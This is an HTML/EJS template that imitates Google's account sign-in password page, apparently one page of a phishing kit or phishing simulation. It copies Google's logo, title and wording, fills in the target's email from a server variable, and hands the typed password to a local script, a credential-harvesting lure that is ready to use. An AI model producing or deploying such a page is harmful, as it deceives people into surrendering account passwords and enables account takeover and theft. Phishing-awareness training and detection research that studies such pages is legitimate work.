<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google Accounts</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="/css/gmail.css" />
</head>
<body class="gmail-page-body">
  <div class="gmail-page">
    <div class="gmail-card">
      <div class="gmail-logo" aria-hidden="true">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
          <path d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z" fill="#FFC107"/>
          <path d="M6.306 14.691l6.571 4.819C14.655 15.108 18.977 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.332 6.306 14.691z" fill="#FF3D00"/>
          <path d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z" fill="#4CAF50"/>
          <path d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 32 44 24c0-1.341-.138-2.65-.389-3.917z" fill="#1976D2"/>
        </svg>
      </div>

      <div class="gmail-account-row">
        <div class="gmail-avatar"><%= email.charAt(0).toUpperCase() %></div>
        <div class="gmail-account-info">
          <span class="gmail-account-email"><%= email %></span>
          <span class="gmail-account-change" id="gmail-change">Change</span>
        </div>
      </div>

      <h1 class="gmail-title gmail-title-sm">Enter your password</h1>
      <p class="gmail-subtitle">to continue to Google</p>

      <form id="gmail-password-form" class="gmail-form" autocomplete="off">
        <div class="gmail-input-wrap">
          <input type="password" id="gmail-password" name="password" placeholder=" " required autofocus />
          <label for="gmail-password">Enter your password</label>
        </div>
        <div class="gmail-helper"><a href="#">Forgot password?</a></div>
        <div class="gmail-actions">
          <a href="/highlights" class="gmail-link">Back</a>
          <button type="submit" class="gmail-btn">Sign in</button>
        </div>
      </form>

      <div id="gmail-loading" class="gmail-loading" style="display:none;">
        <div class="gmail-spinner"></div>
        <p>Signing you in…</p>
      </div>
    </div>

    <footer class="gmail-footer">
      <select class="gmail-lang">
        <option>English (United States)</option>
      </select>
      <div class="gmail-footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </footer>
  </div>

  <script>
    window.__GMAIL_EMAIL__ = "<%= email %>";
  </script>
  <script src="/js/gmail-password.js"></script>
</body>
</html>
